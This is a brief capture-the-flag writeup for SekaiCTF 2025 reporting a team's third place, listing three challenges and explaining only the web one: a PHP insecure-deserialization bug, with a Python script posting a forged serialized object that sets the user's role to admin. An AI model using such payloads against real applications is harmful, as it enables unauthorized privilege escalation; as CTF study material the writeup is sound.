---
title: "SekaiCTF 2025"
pubDate: "2025-07-14"
score: "4200 pts"
place: "3rd place"
tags: ["web", "crypto", "pwn"]
challenges:
  - name: "BabyWeb — Insecure Deserialization"
    category: "web"
    points: "200 pts"
  - name: "NotJustXOR — Custom Cipher Break"
    category: "crypto"
    points: "350 pts"
  - name: "StackSurfer — ret2libc Chain"
    category: "pwn"
    points: "500 pts"
---

# SekaiCTF 2025 Writeup

0xFlag achieved **3rd place** with 4200 points.

## BabyWeb (Web - 200 pts)
Insecure deserialization vulnerability in PHP application payload logic.

```python
import requests
# Exploit payload for PHP deserialization
payload = 'O:4:"User":2:{s:4:"username";s:5:"admin";s:4:"role";s:5:"admin";}'
r = requests.post("https://babyweb.sekai.ctf/api", data={"cookie": payload})
print(r.text)
```
